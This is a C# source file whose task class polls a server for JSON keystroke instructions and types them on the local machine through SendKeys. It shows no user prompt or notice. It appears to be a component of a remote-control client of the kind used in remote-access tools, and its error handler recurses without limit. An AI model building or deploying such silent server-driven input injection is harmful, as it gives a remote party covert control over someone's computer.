using System.Collections.Generic;
using System.IO;
using System.Web.Script.Serialization;
using System.Threading;
using System.Windows.Forms;
using System.Net;

namespace IDK {

    /// <summary>
    /// Task that performs keyboard clicks
    /// </summary>
    class KeyClickerTask : Task {

        /// <summary>
        /// Class constructor
        /// </summary>
        public KeyClickerTask() : base(Config.GetInstance().Settings.KEY_INSTRUCTION_UPDATE_INTERVAL) { }

        /// <summary>
        /// Method that gets called before the execution of the task to perform required initialization
        /// </summary>
        public override void Initialize() {}

        /// <summary>
        /// Method that gets called when the task needs to update (in this case, key click instructions need to be fetched from the server and executed)
        /// </summary>
        public override void Update() {
            try {
                using (WebResponse webResponse = Network.MakeHttpRequest(Config.SERVER_BASE_URL + "key_instructions/instructions.json", "GET")) {
                    using (StreamReader reader = new StreamReader(webResponse.GetResponseStream())) {
                        string response = reader.ReadToEnd();

                        // if the length of the response is 0 then there are no key instructions
                        if (response.Length == 0) {
                            return;
                        } else {
                            // parse key instructions from json and execute them
                            JavaScriptSerializer parser = new JavaScriptSerializer();
                            List<KeyClick> keysToClick = parser.Deserialize<List<KeyClick>>(response);
                            ClickKeys(keysToClick);
                        }
                    }
                }
            } catch {
                Thread.Sleep(Config.CONNECTION_DELAY);
                Update();
            }
        }

        /// <summary>
        /// Clicks specified keys
        /// </summary>
        /// <param name="keys">list containing keys to click</param>
        private void ClickKeys(List<KeyClick> keys) {
            foreach (KeyClick key in keys) {
                if (key.Delay > 0) {
                    Thread.Sleep(key.Delay);
                }

                SendKeys.SendWait(key.Name);
            }
        }


        /// <summary>
        /// Class that holds information about a key click
        /// </summary>
        private class KeyClick {

            // name of the key
            public string Name { get; set; }

            // delay of the key click
            public int Delay { get; set; }
        }
    }
}
